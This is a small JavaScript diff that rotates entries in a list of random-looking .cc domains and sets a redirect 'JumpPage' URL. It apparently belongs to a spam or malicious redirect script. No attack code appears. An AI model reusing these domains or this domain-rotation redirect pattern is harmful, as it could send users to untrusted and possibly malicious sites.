@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
-	'rrhxpgjim.cc',
+	'shxnevix.cc',
 	'idjiizceb.cc',
-	'dnkdbbzg.cc',
+	'rrhxpgjim.cc',
 ];                                                                                                                  
 
 var JumpPage="https://91hlw8.net";
